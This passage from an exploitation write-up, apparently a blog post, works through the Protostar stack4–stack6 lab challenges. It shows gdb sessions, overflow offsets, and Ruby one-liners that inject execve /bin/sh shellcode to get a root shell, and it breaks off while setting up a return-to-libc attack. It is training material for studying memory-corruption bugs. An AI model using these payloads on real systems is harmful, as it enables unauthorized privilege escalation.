</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ gdb -q ./stack4
</span><span class='line'>Reading symbols from /opt/protostar/bin/stack4&hellip;done.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) r
</span><span class='line'>Starting program: /opt/protostar/bin/stack4
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x63413563 in ?? ()&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Window 1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x63413563
</span><span class='line'>[*] Exact match at offset 76&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Window 2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ nm stack4 | grep win
</span><span class='line'>080483f4 T win&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/opt/protostar/bin$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0x080483f4].pack(&ldquo;V&rdquo;)&rsquo; | ./stack4
</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Stack5</h2>

<p><figure class='code'><figcaption><span>stack5.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The idea is the same as in Stack4, but we need to store shellcode on stack, for example.</p>

<p>Stack is executable:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ readelf -a ./stack4 | grep GNU_STACK
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</span></code></pre></td></tr></table></div></figure></p>

<p>To have the same address in bash and gdb, we use hellman&rsquo;s fixenv tool.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ git clone &lt;a href="https://github.com/hellman/fixenv">https://github.com/hellman/fixenv&lt;/a>
</span><span class='line'>Cloning into fixenv&hellip;
</span><span class='line'>remote: Counting objects: 20, done.
</span><span class='line'>Unpacking objects: 100% (20/20), done.
</span><span class='line'>remote: Total 20 (delta 0), reused 0 (delta 0), pack-reused 20&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ cd fixenv/&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack5
</span><span class='line'>GNU gdb (GDB) 7.0.1-debian
</span><span class='line'>Copyright &copy; 2009 Free Software Foundation, Inc.
</span><span class='line'>License GPLv3+: GNU GPL version 3 or later &lt;a href="http://gnu.org/licenses/gpl.html">http://gnu.org/licenses/gpl.html&lt;/a>
</span><span class='line'>This is free software: you are free to change and redistribute it.
</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type &ldquo;show copying&rdquo;
</span><span class='line'>and &ldquo;show warranty&rdquo; for details.
</span><span class='line'>This GDB was configured as &ldquo;i486-linux-gnu&rdquo;.
</span><span class='line'>For bug reporting instructions, please see:
</span><span class='line'>&lt;a href="http://www.gnu.org/software/gdb/bugs/">http://www.gnu.org/software/gdb/bugs/&lt;/a>&hellip;
</span><span class='line'>Reading symbols from /home/user/fixenv/.launcher&hellip;done.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) set disassembly-flavor intel&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) disassemble main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>0x080483c4 &lt;main+0>:    push   ebp
</span><span class='line'>0x080483c5 &lt;main+1>:    mov    ebp,esp
</span><span class='line'>0x080483c7 &lt;main+3>:    and    esp,0xfffffff0
</span><span class='line'>0x080483ca &lt;main+6>:    sub    esp,0x50
</span><span class='line'>0x080483cd &lt;main+9>:    lea    eax,[esp+0x10]
</span><span class='line'>0x080483d1 &lt;main+13>:   mov    DWORD PTR [esp],eax
</span><span class='line'>0x080483d4 &lt;main+16>:   call   0x80482e8 &lt;gets@plt>
</span><span class='line'>0x080483d9 &lt;main+21>:   leave&lt;br/>
</span><span class='line'>0x080483da &lt;main+22>:   ret  &lt;br/>
</span><span class='line'>End of assembler dump.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) b *0x080483d4
</span><span class='line'>Breakpoint 1 at 0x80483d4: file stack5/stack5.c, line 10.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) b *0x080483d9
</span><span class='line'>Breakpoint 2 at 0x80483d9: file stack5/stack5.c, line 11.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) r
</span><span class='line'>Starting program: /home/user/fixenv/.launcher&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Breakpoint 1, 0x080483d4 in main (argc=1, argv=0xbffff914) at stack5/stack5.c:10
</span><span class='line'>10  stack5/stack5.c: No such file or directory.
</span><span class='line'>    in stack5/stack5.c&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) x /xw $esp
</span><span class='line'>0xbffff810: 0xbffff820&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>ABCDEFGH&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Breakpoint 2, main (argc=1, argv=0xbffff914) at stack5/stack5.c:11
</span><span class='line'>11  in stack5/stack5.c
</span><span class='line'>(gdb) x /s 0xbffff820
</span><span class='line'>0xbffff820:  &ldquo;ABCDEFGH&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>The address <code>0xbffff820</code> represents the buffer[] address, we store our
shellcode here and jump to this address. Also we know, that return address is
overwritten after position 76, from Protostar Stack4. We created our shellcode
<a href="http://localhost:4000/blog/2015/06/26/ia-32-linux-shellcode-basics-2/">here</a>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;\x90&rdquo; * (76 - sc.length) + [0xbffff820].pack(&ldquo;V&rdquo;) &rsquo; | ./r.sh /opt/protostar/bin/stack5
</span><span class='line'>user@protostar:~/fixenv$</span></code></pre></td></tr></table></div></figure></p>

<p>The shell is executed, however it receives EOF. For this purposes, we can keep it alive with <code>cat</code> command:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ (ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;\x90&rdquo; * (76 - sc.length) + [0xbffff820].pack(&ldquo;V&rdquo;) &rsquo;; cat -) | ./r.sh /opt/protostar/bin/stack5&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure></p>

<p>Sometimes a more convenient solution could be storing shellcode in environment:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ export EGG=$(ruby -e &lsquo;print &ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;&rsquo;)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~/fixenv$ ./r.sh getvar EGG
</span><span class='line'>0xbfffff60  \x60\xff\xff\xbf  (EGG)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~/fixenv$ ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff60].pack(&ldquo;V&rdquo;)&rsquo; | ./r.sh /opt/protostar/bin/stack5
</span><span class='line'>user@protostar:~/fixenv$&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbfffff60].pack(&ldquo;V&rdquo;)&rsquo; ; cat) | ./r.sh /opt/protostar/bin/stack5&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure></p>

<p>We do not need to use <code>r.sh</code> again - the EGG address could be easily calculated (albeit it&rsquo;s different, because <code>fixenv</code> clears our environment):</p>

<p><figure class='code'><figcaption><span>getenv.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">ptr</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &amp;lt;environment var&amp;gt; &amp;lt;target program name&amp;gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="cm">/* Get environment variable location */</span>
</span><span class='line'>    <span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="cm">/* Adjust for program name */</span>
</span><span class='line'>    <span class="n">ptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s will be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">ptr</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ gcc getenv.c -o getenv&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~/fixenv$ ./getenv EGG /opt/protostar/bin/stack5
</span><span class='line'>EGG will be at 0xbffff9b0&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~/fixenv$ (ruby -e &lsquo;print &ldquo;A&rdquo; * 76 + [0xbffff9b0].pack(&ldquo;V&rdquo;)&rsquo; ; cat) | /opt/protostar/bin/stack5&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=0(root) gid=1001(user) groups=0(root),1001(user)</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Stack6</h2>

<p><figure class='code'><figcaption><span>stack6.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">getpath</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">input</span> <span class="n">path</span> <span class="nl">please</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">ret</span> <span class="o">=</span> <span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">((</span><span class="n">ret</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xbf000000</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">bzzzt</span> <span class="p">(</span><span class="o">%</span><span class="n">p</span><span class="p">)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">ret</span><span class="p">);</span>
</span><span class='line'>      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">got</span> <span class="n">path</span> <span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">getpath</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Using <code>pattern_create.rb</code> / <code>pattern_offset.rb</code> we found out that the stored return address is at offset 80.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/stack6
</span><span class='line'>&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> b main
</span><span class='line'>Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> r
</span><span class='line'>&hellip;
</span><span class='line'>Breakpoint 1, main (argc=0x1, argv=0xbffff804) at stack6/stack6.c:27
</span><span class='line'>27  stack6/stack6.c: No such file or directory.
</span><span class='line'>    in stack6/stack6.c&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> p system
</span><span class='line'>$1 = {&lt;text variable, no debug info>} 0xb7ecffb0 &lt;__libc_system></span></code></pre></td></tr></table></div></figure></p>

<p>There is a great <a href="http://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf">return-to-libc writeup</a>
to explain the stack structure.</p>

<p>Address of <code>system()</code> is always the same, <code>0xb7ecffb0</code>, now we need to find the
<code>/bin/sh</code> string on the stack.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~/fixenv$ ./r.sh gdb /opt/protostar/bin/stack6
</span><span class='line'>&hellip;
</span><span class='line'>(gdb) set disassembly-flavor intel&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) b main
</span><span class='line'>Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) r
</span><span class='line'>Starting program: /home/user/fixenv/.launcher&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) x /10s $esp
</span><span class='line'>&hellip;
</span><span class='line'>0xbfffff0e:  &ldquo;6:&lt;em>.wav=00;36:&lt;/em>.axa=00;36:&lt;em>.oga=00;36:&lt;/em>.spx=00;36:*.xspf=00;36:&rdquo;
</span><span class='line'>0xbfffff4e:  &ldquo;SHELL=/bin/sh&rdquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) x /s 0xbfffff4e+6
</span><span class='line'>0xbfffff54:  &ldquo;/bin/sh&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
